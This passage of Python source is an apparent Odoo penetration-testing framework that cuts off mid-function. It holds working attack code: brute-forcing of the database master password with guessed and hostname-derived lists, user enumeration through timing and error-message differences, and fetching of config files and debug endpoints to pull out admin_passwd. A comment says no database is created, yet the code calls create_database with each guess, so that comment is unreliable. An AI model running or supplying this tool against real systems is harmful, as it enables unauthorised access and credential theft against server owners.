#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Advanced Odoo Penetration Testing Framework
Enhanced comprehensive security assessment tool for Odoo systems
Version: 2.0
Author: Enhanced Security Framework
"""

import sys
import bz2
import json
import logging
import readline
import urllib.request
import xmlrpc.client
import ssl
import random
import itertools
import threading
import time
import re
import requests
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin, urlparse
import xml.etree.ElementTree as ET

# --- Utility for Colored Output ---
class Colors:
    """Enhanced color class with more options."""
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def print_banner():
    """Prints the tool banner."""
    banner = f"""
{Colors.CYAN}{Colors.BOLD}
╔═══════════════════════════════════════════════════════════════╗
║              Advanced Odoo Penetration Testing Framework      ║
║                           Version 2.0                        ║
║              Comprehensive Security Assessment Tool           ║
╚═══════════════════════════════════════════════════════════════╝
{Colors.RESET}
    """
    print(banner)

def print_info(message):
    print(f"{Colors.BLUE}[*] {message}{Colors.RESET}")

def print_success(message):
    print(f"{Colors.GREEN}{Colors.BOLD}[+] {message}{Colors.RESET}")

def print_error(message):
    print(f"{Colors.RED}[-] {message}{Colors.RESET}")

def print_warning(message):
    print(f"{Colors.YELLOW}[!] {message}{Colors.RESET}")

def print_debug(message, silent=False):
    if not silent:
        print(f"{Colors.MAGENTA}[DEBUG] {message}{Colors.RESET}")

def print_vuln(message):
    print(f"{Colors.RED}{Colors.BOLD}[VULN] {message}{Colors.RESET}")

def print_section(title):
    print(f"\n{Colors.CYAN}{Colors.BOLD}{'='*60}")
    print(f" {title}")
    print(f"{'='*60}{Colors.RESET}\n")

# --- Logger Configuration ---
def setup_logger():
    logger = logging.getLogger("OdooPentest")
    logger.setLevel(logging.INFO)
    
    # File handler
    fh = logging.FileHandler(f'odoo_pentest_{datetime.now().strftime("%Y%m%d_%H%M%S")}.log')
    fh.setLevel(logging.INFO)
    
    # Console handler
    ch = logging.StreamHandler()
    ch.setLevel(logging.WARNING)
    
    # Formatter
    formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
    fh.setFormatter(formatter)
    ch.setFormatter(formatter)
    
    logger.addHandler(fh)
    logger.addHandler(ch)
    
    return logger

# --- Vulnerability Database ---
class OdooVulnerabilityDB:
    """Database of known Odoo vulnerabilities organized by version."""
    
    def __init__(self):
        self.vulnerabilities = {
            "8.0": [
                {"cve": "CVE-2016-10313", "description": "SQL Injection in website_blog", "severity": "High"},
                {"cve": "CVE-2017-9610", "description": "XSS in website module", "severity": "Medium"},
                {"cve": "N/A", "description": "Weak session management", "severity": "Medium"},
            ],
            "9.0": [
                {"cve": "CVE-2017-9610", "description": "XSS in website module", "severity": "Medium"},
                {"cve": "CVE-2018-15895", "description": "Authentication bypass", "severity": "Critical"},
                {"cve": "N/A", "description": "Unrestricted file upload", "severity": "High"},
            ],
            "10.0": [
                {"cve": "CVE-2018-15895", "description": "Authentication bypass", "severity": "Critical"},
                {"cve": "CVE-2019-9168", "description": "SQL Injection in web controller", "severity": "High"},
                {"cve": "N/A", "description": "Directory traversal in file handling", "severity": "High"},
            ],
            "11.0": [
                {"cve": "CVE-2019-9168", "description": "SQL Injection in web controller", "severity": "High"},
                {"cve": "CVE-2020-12135", "description": "Remote code execution", "severity": "Critical"},
                {"cve": "N/A", "description": "CSRF in admin interface", "severity": "Medium"},
            ],
            "12.0": [
                {"cve": "CVE-2020-12135", "description": "Remote code execution", "severity": "Critical"},
                {"cve": "CVE-2021-23169", "description": "Path traversal vulnerability", "severity": "High"},
                {"cve": "N/A", "description": "Privilege escalation", "severity": "High"},
            ],
            "13.0": [
                {"cve": "CVE-2021-23169", "description": "Path traversal vulnerability", "severity": "High"},
                {"cve": "CVE-2022-30766", "description": "Authentication bypass", "severity": "Critical"},
                {"cve": "N/A", "description": "Information disclosure", "severity": "Medium"},
            ],
            "14.0": [
                {"cve": "CVE-2022-30766", "description": "Authentication bypass", "severity": "Critical"},
                {"cve": "CVE-2023-28862", "description": "SQL Injection", "severity": "High"},
                {"cve": "N/A", "description": "Session fixation", "severity": "Medium"},
            ],
            "15.0": [
                {"cve": "CVE-2023-28862", "description": "SQL Injection", "severity": "High"},
                {"cve": "N/A", "description": "XML External Entity (XXE)", "severity": "High"},
                {"cve": "N/A", "description": "Weak password policy", "severity": "Low"},
            ],
            "16.0": [
                {"cve": "N/A", "description": "XML External Entity (XXE)", "severity": "High"},
                {"cve": "N/A", "description": "Cross-site scripting (XSS)", "severity": "Medium"},
                {"cve": "N/A", "description": "Insecure direct object reference", "severity": "Medium"},
            ],
            "17.0": [
                {"cve": "N/A", "description": "Potential authentication weaknesses", "severity": "Medium"},
                {"cve": "N/A", "description": "Input validation issues", "severity": "Low"},
            ]
        }
    
    def get_vulnerabilities(self, version):
        """Get vulnerabilities for a specific version."""
        major_version = ".".join(version.split(".")[:2]) if version else "unknown"
        return self.vulnerabilities.get(major_version, [])

# --- Enhanced Password Generator ---
class AdvancedPasswordGenerator:
    """Advanced password generator with multiple strategies."""
    
    def __init__(self, target_info=None):
        self.target_info = target_info or {}
        self.common_passwords = [
            "admin", "password", "123456", "odoo", "openerp", "test", "demo",
            "Administrator", "root", "user", "guest", "public", "company"
        ]
        self.year_range = range(2010, datetime.now().year + 2)
        
    def generate_context_passwords(self, keywords, num_passwords=500):
        """Generate context-aware passwords."""
        passwords = set()
        
        # Base keywords
        for keyword in keywords:
            if not keyword.strip():
                continue
            keyword = keyword.strip()
            passwords.add(keyword)
            passwords.add(keyword.lower())
            passwords.add(keyword.upper())
            passwords.add(keyword.capitalize())
            
            # Common patterns
            for year in self.year_range:
                passwords.add(f"{keyword}{year}")
                passwords.add(f"{keyword}_{year}")
                passwords.add(f"{year}{keyword}")
                
            # Special characters
            for suffix in ["!", "@", "#", "$", "%", "123", "12345", "1234567890"]:
                passwords.add(f"{keyword}{suffix}")
                passwords.add(f"{suffix}{keyword}")
                
            # Leetspeak
            leet = keyword.replace('a', '@').replace('e', '3').replace('i', '1').replace('o', '0').replace('s', '$')
            passwords.add(leet)
            
        # Company/domain specific
        if 'company' in self.target_info:
            company = self.target_info['company']
            passwords.update(self._generate_company_passwords(company))
            
        # Common combinations
        while len(passwords) < num_passwords:
            base = random.choice(list(passwords) + keywords + self.common_passwords)
            suffix = random.choice(["123", "!", "@", "#", str(random.randint(1, 999))])
            passwords.add(f"{base}{suffix}")
            
        return list(passwords)[:num_passwords]
    
    def _generate_company_passwords(self, company):
        """Generate company-specific passwords."""
        passwords = set()
        company_clean = re.sub(r'[^a-zA-Z0-9]', '', company).lower()
        
        patterns = [
            f"{company_clean}123",
            f"{company_clean}@123",
            f"{company_clean}{datetime.now().year}",
            f"admin{company_clean}",
            f"{company_clean}admin",
            f"{company_clean}password",
        ]
        
        passwords.update(patterns)
        return passwords

# --- System Information Gatherer ---
class OdooSystemInfoGatherer:
    """Gathers comprehensive system information from Odoo instance."""
    
    def __init__(self, target_url, session=None):
        self.target_url = target_url
        self.session = session or requests.Session()
        self.info = {}
        
    def gather_web_info(self):
        """Gather information from web interface."""
        print_info("Gathering web interface information...")
        
        try:
            # Main page
            response = self.session.get(self.target_url, timeout=10)
            self.info['web_title'] = self._extract_title(response.text)
            self.info['server_header'] = response.headers.get('Server', 'Unknown')
            
            # Database selector page
            db_url = urljoin(self.target_url, '/web/database/selector')
            response = self.session.get(db_url, timeout=10)
            if response.status_code == 200:
                self.info['database_selector_accessible'] = True
                
            # Version info from manifest
            self._try_version_detection()
            
            # Check for exposed files
            self._check_exposed_files()
            
        except Exception as e:
            print_debug(f"Error gathering web info: {e}")
            
    def _extract_title(self, html):
        """Extract title from HTML."""
        match = re.search(r'<title>(.*?)</title>', html, re.IGNORECASE)
        return match.group(1) if match else "Unknown"
    
    def _try_version_detection(self):
        """Try to detect Odoo version."""
        version_urls = [
            '/web/static/src/js/framework/core.js',
            '/web/static/src/xml/base.xml',
            '/web/static/lib/jquery/jquery.js',
        ]
        
        for url in version_urls:
            try:
                response = self.session.get(urljoin(self.target_url, url), timeout=5)
                if 'odoo' in response.text.lower():
                    version_match = re.search(r'version["\s:]+([0-9]+\.[0-9]+)', response.text, re.IGNORECASE)
                    if version_match:
                        self.info['detected_version'] = version_match.group(1)
                        break
            except:
                continue
                
    def _check_exposed_files(self):
        """Check for commonly exposed files."""
        exposed_files = [
            '/web/database/manager',
            '/web/database/create',
            '/xmlrpc/2/common',
            '/xmlrpc/2/object',
            '/web/static/src/',
            '/.git/',
            '/backup/',
            '/logs/',
        ]
        
        self.info['exposed_endpoints'] = []
        for file_path in exposed_files:
            try:
                response = self.session.get(urljoin(self.target_url, file_path), timeout=5)
                if response.status_code not in [404, 403]:
                    self.info['exposed_endpoints'].append(file_path)
            except:
                continue

# --- Enhanced XML-RPC Transport ---
class EnhancedTimeoutTransport(xmlrpc.client.SafeTransport):
    """Enhanced transport with better timeout and SSL handling."""
    
    def __init__(self, timeout=None, use_https=False, disable_ssl_verify=False, *args, **kwargs):
        context = None
        if use_https:
            if disable_ssl_verify:
                context = ssl._create_unverified_context()
            else:
                context = ssl.create_default_context()
        super().__init__(context=context, *args, **kwargs)
        self.timeout = timeout

    def make_connection(self, host):
        conn = super().make_connection(host)
        if self.timeout is not None:
            conn.timeout = self.timeout
        return conn

# --- Main Penetration Testing Framework ---
class OdooPentestFramework:
    """Comprehensive Odoo penetration testing framework."""
    
    def __init__(self, host, port, timeout=10, use_ssl=False, disable_ssl_verify=False, silent=False):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.use_ssl = use_ssl
        self.disable_ssl_verify = disable_ssl_verify
        self.silent = silent
        self.logger = setup_logger()
        
        # URLs
        protocol = "https" if self.use_ssl else "http"
        self.base_url = f"{protocol}://{host}:{port}"
        self.common_url = f"{self.base_url}/xmlrpc/2/common"
        self.db_url = f"{self.base_url}/xmlrpc/2/db"
        self.object_url = f"{self.base_url}/xmlrpc/2/object"
        
        # Components
        self.vuln_db = OdooVulnerabilityDB()
        self.info_gatherer = OdooSystemInfoGatherer(self.base_url)
        
        # Results
        self.results = {
            'target_info': {},
            'databases': [],
            'users_found': [],
            'valid_credentials': [],
            'vulnerabilities': [],
            'system_info': {},
            'security_issues': []
        }
        
        self.proxies = None
        self.databases = []
        self.selected_database = None
        
    def run_comprehensive_assessment(self):
        """Run complete penetration testing assessment."""
        print_section("STARTING COMPREHENSIVE ODOO SECURITY ASSESSMENT")
        
        try:
            # Phase 1: Reconnaissance
            self.phase_reconnaissance()
            
            # Phase 2: Service Discovery
            self.phase_service_discovery()
            
            # Phase 3: Vulnerability Assessment
            self.phase_vulnerability_assessment()
            
            # Phase 4: Authentication Testing
            self.phase_authentication_testing()
            
            # Phase 5: Post-Exploitation (if credentials found)
            if self.results['valid_credentials']:
                self.phase_post_exploitation()
                
            # Phase 6: Generate Report
            self.generate_report()
            
        except KeyboardInterrupt:
            print_error("\nAssessment interrupted by user.")
            self.generate_report()
        except Exception as e:
            print_error(f"Critical error during assessment: {e}")
            self.logger.error("Critical error during assessment", exc_info=True)
            
    def phase_reconnaissance(self):
        """Phase 1: Reconnaissance and information gathering."""
        print_section("PHASE 1: RECONNAISSANCE")
        
        print_info("Gathering target information...")
        self.results['target_info'] = {
            'host': self.host,
            'port': self.port,
            'protocol': 'HTTPS' if self.use_ssl else 'HTTP',
            'target_url': self.base_url,
            'scan_time': datetime.now().isoformat()
        }
        
        # Web information gathering
        try:
            self.info_gatherer.gather_web_info()
            self.results['system_info'] = self.info_gatherer.info
            print_success(f"Web info gathered: {len(self.info_gatherer.info)} items")
        except Exception as e:
            print_warning(f"Web info gathering failed: {e}")
            
    def phase_service_discovery(self):
        """Phase 2: Service discovery and enumeration."""
        print_section("PHASE 2: SERVICE DISCOVERY")
        
        # Test XML-RPC connectivity
        if self._test_xmlrpc_connectivity():
            print_success("XML-RPC services are accessible")
            
            # Enumerate databases
            self._enumerate_databases()
            
            # Test database operations
            self._test_database_operations()
        else:
            print_error("XML-RPC services not accessible")
            
    def phase_vulnerability_assessment(self):
        """Phase 3: Vulnerability assessment."""
        print_section("PHASE 3: VULNERABILITY ASSESSMENT")
        
        # Detect version
        version = self._detect_odoo_version()
        if version:
            print_success(f"Detected Odoo version: {version}")
            self.results['target_info']['version'] = version
            
            # Check for version-specific vulnerabilities
            vulns = self.vuln_db.get_vulnerabilities(version)
            self.results['vulnerabilities'] = vulns
            
            if vulns:
                print_warning(f"Found {len(vulns)} known vulnerabilities for version {version}")
                for vuln in vulns:
                    severity_color = Colors.RED if vuln['severity'] == 'Critical' else Colors.YELLOW
                    print(f"  {severity_color}[{vuln['severity']}] {vuln['description']} ({vuln['cve']}){Colors.RESET}")
            else:
                print_info("No known vulnerabilities found for this version")
        else:
            print_warning("Could not detect Odoo version")
            
        # Check for common security misconfigurations
        self._check_security_misconfigurations()
        
    def phase_authentication_testing(self):
        """Phase 4: Authentication testing."""
        print_section("PHASE 4: AUTHENTICATION TESTING")
        
        if not self.databases:
            print_error("No databases available for authentication testing")
            return
            
        # Select database for testing
        self._select_database_for_testing()
        
        if self.selected_database:
            print_info(f"Testing authentication on database: {self.selected_database}")
            
            # User enumeration
            self._enumerate_users()
            
            # Password attacks
            self._perform_password_attacks()
        else:
            print_error("No database selected for authentication testing")
            
    def phase_post_exploitation(self):
        """Phase 5: Post-exploitation activities."""
        print_section("PHASE 5: POST-EXPLOITATION")
        
        for creds in self.results['valid_credentials']:
            print_info(f"Performing post-exploitation with user: {creds['user']}")
            
            try:
                # Connect with valid credentials
                uid = self._connect_with_credentials(creds)
                if uid:
                    # Extract system information
                    self._extract_system_information(uid, creds)
                    
                    # Extract user information
                    self._extract_user_information(uid, creds)
                    
                    # Check privileges
                    self._check_user_privileges(uid, creds)
                    
            except Exception as e:
                print_error(f"Post-exploitation failed for {creds['user']}: {e}")
                
    def _test_xmlrpc_connectivity(self):
        """Test XML-RPC connectivity."""
        try:
            transport = EnhancedTimeoutTransport(
                timeout=self.timeout,
                use_https=self.use_ssl,
                disable_ssl_verify=self.disable_ssl_verify
            )
            common_proxy = xmlrpc.client.ServerProxy(self.common_url, transport=transport)
            version_info = common_proxy.version()
            print_success(f"XML-RPC connection successful. Server version: {version_info}")
            return True
        except Exception as e:
            print_error(f"XML-RPC connection failed: {e}")
            self.logger.error("XML-RPC connection failed", exc_info=True)
            return False
            
    def _enumerate_databases(self):
        """Enumerate available databases."""
        try:
            transport = EnhancedTimeoutTransport(
                timeout=self.timeout,
                use_https=self.use_ssl,
                disable_ssl_verify=self.disable_ssl_verify
            )
            db_proxy = xmlrpc.client.ServerProxy(self.db_url, transport=transport)
            self.databases = db_proxy.list()
            self.results['databases'] = self.databases
            
            if self.databases:
                print_success(f"Found {len(self.databases)} databases: {', '.join(self.databases)}")
            else:
                print_warning("No databases found or database listing disabled")
                
        except Exception as e:
            print_error(f"Database enumeration failed: {e}")
            self.results['security_issues'].append({
                'type': 'Database Enumeration Error',
                'description': str(e),
                'severity': 'Medium'
            })
            
    def _test_database_operations(self):
        """Test various database operations."""
        operations_to_test = [
            ('create', 'Database creation'),
            ('drop', 'Database deletion'),
            ('dump', 'Database backup'),
            ('restore', 'Database restore'),
        ]
        
        for operation, description in operations_to_test:
            try:
                transport = EnhancedTimeoutTransport(
                    timeout=5,
                    use_https=self.use_ssl,
                    disable_ssl_verify=self.disable_ssl_verify
                )
                db_proxy = xmlrpc.client.ServerProxy(self.db_url, transport=transport)
                
                # Try to call the operation with minimal parameters to see if it's accessible
                if operation == 'create':
                    # This will likely fail due to missing parameters, but we can detect if the method exists
                    try:
                        db_proxy.create_database("", "", False, "en_US", "")
                    except xmlrpc.client.Fault as fault:
                        if "missing" in fault.faultString.lower() or "required" in fault.faultString.lower():
                            print_warning(f"{description} appears to be accessible (method exists)")
                            self.results['security_issues'].append({
                                'type': 'Exposed Database Operation',
                                'description': f'{description} method is accessible',
                                'severity': 'High'
                            })
                            
            except Exception as e:
                print_debug(f"Testing {operation}: {e}")
                
    def _detect_odoo_version(self):
        """Detect Odoo version through various methods."""
        try:
            transport = EnhancedTimeoutTransport(
                timeout=self.timeout,
                use_https=self.use_ssl,
                disable_ssl_verify=self.disable_ssl_verify
            )
            common_proxy = xmlrpc.client.ServerProxy(self.common_url, transport=transport)
            version_info = common_proxy.version()
            
            if isinstance(version_info, dict) and 'server_version' in version_info:
                return version_info['server_version']
            elif isinstance(version_info, str):
                return version_info
                
        except Exception as e:
            print_debug(f"Version detection via XML-RPC failed: {e}")
            
        # Try web-based detection
        if 'detected_version' in self.results.get('system_info', {}):
            return self.results['system_info']['detected_version']
            
        return None
        
    def _check_security_misconfigurations(self):
        """Check for common security misconfigurations."""
        issues = []
        
        # Check if database listing is enabled
        if self.databases:
            issues.append({
                'type': 'Database Enumeration',
                'description': 'Database listing is enabled, allowing enumeration of database names',
                'severity': 'Medium'
            })
            
        # Check for exposed endpoints
        if 'exposed_endpoints' in self.results.get('system_info', {}):
            for endpoint in self.results['system_info']['exposed_endpoints']:
                issues.append({
                    'type': 'Exposed Endpoint',
                    'description': f'Exposed endpoint found: {endpoint}',
                    'severity': 'Low' if endpoint.startswith('/web/static') else 'Medium'
                })
                
        # Check for database manager access
        if '/web/database/manager' in self.results.get('system_info', {}).get('exposed_endpoints', []):
            issues.append({
                'type': 'Database Manager Exposed',
                'description': 'Database manager interface is accessible without authentication',
                'severity': 'High'
            })
            
        self.results['security_issues'].extend(issues)
        
        if issues:
            print_warning(f"Found {len(issues)} security misconfigurations")
            for issue in issues:
                print(f"  [{issue['severity']}] {issue['description']}")
        else:
            print_success("No obvious security misconfigurations found")
            
    def _select_database_for_testing(self):
        """Select a database for authentication testing."""
        if len(self.databases) == 1:
            self.selected_database = self.databases[0]
            print_info(f"Automatically selected database: {self.selected_database}")
        else:
            print_info(f"Available databases: {', '.join(self.databases)}")
            while not self.selected_database:
                db_choice = input(f"{Colors.YELLOW}Select database for testing: {Colors.RESET}")
                if db_choice in self.databases:
                    self.selected_database = db_choice
                    print_success(f"Selected database: {self.selected_database}")
                else:
                    print_error("Invalid database selection")
                    
    def _enumerate_users(self):
        """Attempt to enumerate users using multiple techniques."""
        print_info("Attempting user enumeration...")
        
        # Test for master password first
        self._test_master_password()
        
        # Common usernames to try
        common_users = [
            'admin', 'administrator', 'root', 'user', 'demo', 'test',
            'odoo', 'openerp', 'guest', 'public', 'manager', 'supervisor'
        ]
        
        found_users = []
        
        # Method 1: Timing-based user enumeration
        print_info("Testing timing-based user enumeration...")
        timing_users = self._timing_based_user_enum(common_users)
        
        # Method 2: Error message differential analysis
        print_info("Testing error message analysis...")
        error_users = self._error_message_user_enum(common_users)
        
        # Method 3: Web interface user enumeration
        print_info("Testing web interface user hints...")
        web_users = self._web_based_user_enum()
        
        # Combine results and validate
        potential_users = set(timing_users + error_users + web_users)
        
        # Validate found users with additional checks
        for username in potential_users:
            confidence = self._validate_user_existence(username)
            if confidence > 0.6:  # Only include users with high confidence
                found_users.append({
                    'username': username,
                    'confidence': confidence,
                    'detection_method': self._get_detection_method(username, timing_users, error_users, web_users)
                })
                
        self.results['users_found'] = found_users
        
        if found_users:
            print_success(f"Found {len(found_users)} potential users:")
            for user_info in found_users:
                confidence_color = Colors.GREEN if user_info['confidence'] > 0.8 else Colors.YELLOW
                print(f"  {confidence_color}{user_info['username']}{Colors.RESET} (confidence: {user_info['confidence']:.2f}, method: {user_info['detection_method']})")
        else:
            print_warning("No users enumerated with high confidence")
            
    def _test_master_password(self):
        """Test for Odoo database master password."""
        print_info("Testing for database master password...")
        
        # Common master passwords
        master_passwords = [
            'admin', 'password', '123456', 'odoo', 'openerp', 'master',
            'admin123', 'password123', 'odoo123', '12345678', 'qwerty',
            'root', 'toor', 'administrator', 'demo', 'test', 'changeme',
            'default', 'postgres', 'postgresql', 'database', 'db',
            '1234', '12345', 'abc123', 'Admin123', 'Password123'
        ]
        
        # Add context-specific passwords
        if self.host and not self.host.replace('.', '').isdigit():
            hostname_parts = self.host.split('.')
            for part in hostname_parts:
                if len(part) > 2:
                    master_passwords.extend([
                        part, part.capitalize(), part.upper(),
                        f"{part}123", f"{part}@123", f"admin{part}"
                    ])
        
        found_master_passwords = []
        
        try:
            transport = EnhancedTimeoutTransport(
                timeout=self.timeout,
                use_https=self.use_ssl,
                disable_ssl_verify=self.disable_ssl_verify
            )
            db_proxy = xmlrpc.client.ServerProxy(self.db_url, transport=transport)
            
            for master_pwd in master_passwords:
                try:
                    # Test database operations that require master password
                    test_operations = [
                        ('list', []),
                        ('server_version', []),
                        ('create_database', ['test_temp_db_12345', master_pwd, False, 'en_US', 'admin'])
                    ]
                    
                    for operation, params in test_operations:
                        try:
                            if operation == 'create_database':
                                # Don't actually create, just test authentication
                                # This will fail but give us info about master password validity
                                result = getattr(db_proxy, operation)(*params)
                            else:
                                result = getattr(db_proxy, operation)(*params)
                                
                            # If we get here without exception, operation might be unrestricted
                            if operation in ['list', 'server_version']:
                                print_warning(f"Database {operation} operation accessible without master password")
                                self.results['security_issues'].append({
                                    'type': 'Unrestricted Database Access',
                                    'description': f'Database {operation} accessible without master password',
                                    'severity': 'High'
                                })
                                
                        except xmlrpc.client.Fault as fault:
                            fault_msg = fault.faultString.lower()
                            
                            if operation == 'create_database':
                                if 'password' in fault_msg and 'wrong' not in fault_msg:
                                    # Password was accepted but operation failed for other reasons
                                    found_master_passwords.append({
                                        'password': master_pwd,
                                        'confidence': 0.9,
                                        'method': 'create_database_test'
                                    })
                                    print_success(f"Potential master password found: {master_pwd}")
                                elif 'already exists' in fault_msg:
                                    # Database exists, but password was accepted
                                    found_master_passwords.append({
                                        'password': master_pwd,
                                        'confidence': 0.8,
                                        'method': 'database_exists_test'
                                    })
                                    print_success(f"Likely master password found: {master_pwd}")
                            
                        except Exception as e:
                            print_debug(f"Master password test {master_pwd} failed: {e}")
                            continue
                            
                except Exception as e:
                    print_debug(f"Master password {master_pwd} test error: {e}")
                    continue
                    
        except Exception as e:
            print_error(f"Master password testing failed: {e}")
            
        # Test alternative master password methods
        self._test_master_password_alternatives()
        
        if found_master_passwords:
            self.results['master_passwords'] = found_master_passwords
            print_success(f"Found {len(found_master_passwords)} potential master passwords:")
            for mp in found_master_passwords:
                print(f"  {Colors.RED}{mp['password']}{Colors.RESET} (confidence: {mp['confidence']}, method: {mp['method']})")
        else:
            print_info("No master passwords identified")
            
    def _test_master_password_alternatives(self):
        """Test alternative methods to detect master password."""
        print_info("Testing alternative master password detection methods...")
        
        # Method 1: Configuration file analysis (if accessible)
        self._test_config_file_access()
        
        # Method 2: Environment variable disclosure
        self._test_env_disclosure()
        
        # Method 3: Backup file enumeration
        self._test_backup_enumeration()
        
    def _test_config_file_access(self):
        """Test for accessible configuration files."""
        config_paths = [
            '/etc/odoo/odoo.conf',
            '/etc/odoo.conf',
            '/opt/odoo/odoo.conf',
            '/odoo.conf',
            '/.odoorc',
            '/config/odoo.conf',
            '/app/odoo.conf'
        ]
        
        for config_path in config_paths:
            try:
                response = requests.get(
                    f"{self.base_url}{config_path}",
                    timeout=5,
                    verify=not self.disable_ssl_verify
                )
                
                if response.status_code == 200 and 'admin_passwd' in response.text:
                    print_vuln(f"Configuration file exposed: {config_path}")
                    
                    # Extract master password from config
                    admin_passwd_match = re.search(r'admin_passwd\s*=\s*([^\s\n]+)', response.text)
                    if admin_passwd_match:
                        master_pwd = admin_passwd_match.group(1).strip('\'"')
                        print_vuln(f"Master password found in config: {master_pwd}")
                        
                        if 'master_passwords' not in self.results:
                            self.results['master_passwords'] = []
                        
                        self.results['master_passwords'].append({
                            'password': master_pwd,
                            'confidence': 1.0,
                            'method': 'config_file_disclosure',
                            'source': config_path
                        })
                        
            except Exception as e:
                print_debug(f"Config file test {config_path} failed: {e}")
                
    def _test_env_disclosure(self):
        """Test for environment variable disclosure."""
        env_endpoints = [
            '/web/database/manager',
            '/debug',
            '/info',
            '/status',
            '/health'
        ]
        
        for endpoint in env_endpoints:
            try:
                response = requests.get(
                    f"{self.base_url}{endpoint}",
                    timeout=5,
                    verify=not self.disable_ssl_verify
                )
                
                if response.status_code == 200:
                    # Look for environment variables or debug info
                    env_patterns = [
                        r'ADMIN_PASSWD["\s]*[:=]["\s]*([^"\s\n]+)',
                        r'admin_passwd["\s]*[:=]["\s]*([^"\s\n]+)',
                        r'ODOO_MASTER["\s]*[:=]["\s]*([^"\s\n]+)'
                    ]
                    
                    for pattern in env_patterns:
                        matches = re.findall(pattern, response.text, re.IGNORECASE)
                        if matches:
                            for match in matches:
                                print_vuln(f"Master password found via {endpoint}: {match}")
                                
                                if 'master_passwords' not in self.results:
                                    self.results['master_passwords'] = []
                                
                                self.results['master_passwords'].append({
                                    'password': match,
                                    'confidence': 0.9,
                                    'method': 'env_disclosure',
                                    'source': endpoint
                                })
                                
            except Exception as e:
                print_debug(f"Environment disclosure test {endpoint} failed: {e}")
                
    def _test_backup_enumeration(self):
        """Test for backup files that might contain master password."""
        backup_paths = [
            '/backup/',
            '/backups/',
            '/dumps/',
            '/db_backup/',
            '/database_backup/',
            '/odoo_backup/',
            '/filestore/',
            '/data/'
        ]
        
        for backup_path in backup_paths:
            try:
                response = requests.get(
                    f"{self.base_url}{backup_path}",
                    timeout=5,
                    verify=not self.disable_ssl_verify
                )
                
                if response.status_code == 200:
                    print_warning(f"Backup directory accessible: {backup_path}")
                    self.results['security_issues'].append({
                        'type': 'Exposed Backup Directory',
                        'description': f'Backup directory accessible: {backup_path}',
                        'severity': 'High'
                    })
                    
                    # Look for database files or configs in backup
                    if '.zip' in response.text or '.sql' in response.text or '.conf' in response.text:
                        print_vuln(f"Potential sensitive files found in {backup_path}")
                        
            except Exception as e:
                print_debug(f"Backup enumeration test {backup_path} failed: {e}")
                
    def _timing_based_user_enum(self, usernames):
        """Perform timing-based user enumeration with statistical analysis."""
        found_users = []
        timing_baseline = []
        
        # Establish baseline with multiple invalid usernames
        invalid_users = [f"invalid_user_{random.randint(10000, 99999)}" for _ in range(5)]
        
        # Collect baseline timings with random delays between attempts
        for invalid_user in invalid_users:
            timings = []
            for _ in range(3):  # Multiple samples per username
                time.sleep(random.uniform(0.1, 0.3))  # Random delay to avoid rate limiting
                start_time = time.time()
                try:
                    self._test_login_attempt(invalid_user, f"invalid_pass_{random.randint(1000, 9999)}")
                except:
                    pass
                timings.append(time.time() - start_time)
            timing_baseline.extend(timings)
            
        # Calculate statistical measures
        baseline_avg = sum(timing_baseline) / len(timing_baseline)
        baseline_std = (sum((x - baseline_avg) ** 2 for x in timing_baseline) / len(timing_baseline)) ** 0.5
        threshold = baseline_avg + (2 * baseline_std)  # Use 2 standard deviations for 95% confidence
        
        for username in usernames:
            timings = []
            for _ in range(3):  # Multiple attempts for accuracy
                start_time = time.time()
                try:
                    self._test_login_attempt(username, 'invalid_password_12345')
                except:
                    pass
                timings.append(time.time() - start_time)
                time.sleep(0.5)  # Small delay between attempts
                
            avg_timing = sum(timings) / len(timings)
            
            if avg_timing > threshold:
                found_users.append(username)
                print_debug(f"Timing anomaly for user {username}: {avg_timing:.3f}s vs baseline {baseline_avg:.3f}s")
                
        return found_users
        
    def _error_message_user_enum(self, usernames):
        """Enumerate users based on error message differences."""
        found_users = []
        
        # Get baseline error for invalid user
        baseline_error = None
        try:
            self._test_login_attempt('user_definitely_not_exists_12345', 'invalid_password')
        except xmlrpc.client.Fault as fault:
            baseline_error = fault.faultString
        except Exception as e:
            baseline_error = str(e)
            
        for username in usernames:
            try:
                self._test_login_attempt(username, 'invalid_password_12345')
            except xmlrpc.client.Fault as fault:
                error_msg = fault.faultString
                
                # Compare error messages
                if error_msg != baseline_error:
                    # Different error suggests user exists
                    if 'password' in error_msg.lower() and 'wrong' in error_msg.lower():
                        found_users.append(username)
                        print_debug(f"Error differential for {username}: {error_msg}")
                    elif 'locked' in error_msg.lower() or 'disabled' in error_msg.lower():
                        found_users.append(username)
                        print_warning(f"User {username} appears to be locked/disabled")
                        
            except Exception as e:
                print_debug(f"Error message enum failed for {username}: {e}")
                
        return found_users
        
    def _web_based_user_enum(self):
        """Attempt user enumeration through web interface."""
        found_users = []
        
        try:
            # Check login page for user hints
            response = requests.get(
                f"{self.base_url}/web/login",
                timeout=self.timeout,
                verify=not self.disable_ssl_verify
            )
            
            if response.status_code == 200:
                # Look for user hints in HTML/JavaScript
                user_patterns = [
                    r'default[_\s]*user["\s]*[:=]["\s]*([^"\s\n]+)',
                    r'demo[_\s]*user["\s]*[:=]["\s]*([^"\s\n]+)',
                    r'admin[_\s]*user["\s]*[:=]["\s]*([^"\s\n]+)'
                ]
                
                for pattern in user_patterns:
                    matches = re.findall(pattern, response.text, re.IGNORECASE)
                    found_users.extend(matches)
                    
            # Check for user management pages
            user_pages = [
                '/web/database/manager',
                '/web#action=base.action_res_users',
                '/web/session/logout'
            ]
            
            for page in user_pages:
                try:
                    response = requests.get(
                        f"{self.base_url}{page}",
                        timeout=5,
                        verify=not self.disable_ssl_verify
                    )
                    
                    if response.status_code == 200 and 'user' in response.text.lower():
                        # Extract any visible usernames
                        username_patterns = [
                            r'login["\s]*[:=]["\s]*([^"\s\n<>]+)',
                            r'username["\s]*[:=]["\s]*([^"\s\n<>]+)'
                        ]
                        
                        for pattern in username_patterns:
                            matches = re.findall(pattern, response.text, re.IGNORECASE)
                            found_users.extend(matches)
                            
                except Exception as e:
                    print_debug(f"Web user enum failed for {page}: {e}")
                    
        except Exception as e:
            print_debug(f"Web-based user enumeration failed: {e}")
            
